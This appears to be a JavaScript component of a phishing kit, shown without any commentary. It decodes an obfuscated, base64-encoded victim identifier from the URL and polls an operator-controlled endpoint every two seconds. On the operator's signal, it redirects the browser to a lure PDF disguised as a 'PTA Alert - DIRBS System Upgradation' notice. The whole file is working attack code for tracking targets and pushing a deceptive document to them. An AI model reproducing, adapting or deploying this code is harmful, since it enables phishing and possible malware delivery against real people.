function getQueryParameter(parameterName) {
  var queryString = window.location.search;
  var urlParams = new URLSearchParams(queryString);
  return urlParams.get(parameterName);
}

var valueuser = getQueryParameter('NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj');
var shortuser = getQueryParameter('svhsdfhadeiueirncbxjcbbxcxb');
var b64user = '';
if (valueuser) {
  var decoddata = atob(valueuser);
  var urldata = decoddata.split('/');
  var userid = urldata[1];
  b64user = btoa(userid);
} else if (shortuser) {
  b64user = shortuser;
}

function checkForUpdates() {
  fetch(`/codeload/fetchtap/?jfhdgigndfjnguertsdfiwjeo=${b64user}`)
    .then(response => response.json())
    .then(data => {
      var code = data.results;
      var a = code[0].pagetype;
      var num = parseInt(a, 10);

      if (a !== "999") { checkForUpdates(); }

      var filepath = '/PTA Alert - DIRBS System Upgradation.pdf';
      if (Number.isInteger(num) && num === 999) {
        window.location.href = filepath;
      }
    })
    .catch(error => console.error('Error in Fetch request:', error));
}

setInterval(checkForUpdates, 2000);
